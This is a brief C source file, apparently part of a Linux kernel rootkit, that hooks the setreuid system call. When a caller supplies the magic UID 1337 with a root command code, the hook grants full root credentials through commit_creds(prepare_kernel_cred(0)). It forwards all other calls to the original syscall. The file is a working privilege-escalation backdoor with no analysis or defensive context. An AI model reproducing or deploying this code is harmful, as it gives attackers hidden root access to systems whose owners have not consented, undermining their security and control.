#include <linux/cred.h>

#include <r0mod/global.h>

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if(ruid == 1337)
    {
        switch(euid)
        {
            case CMD_ROOT:
                commit_creds(prepare_kernel_cred(0));
                return new_setreuid(0, 0);
            break;
        }
    }

    return orig_setreuid(ruid, euid);
}
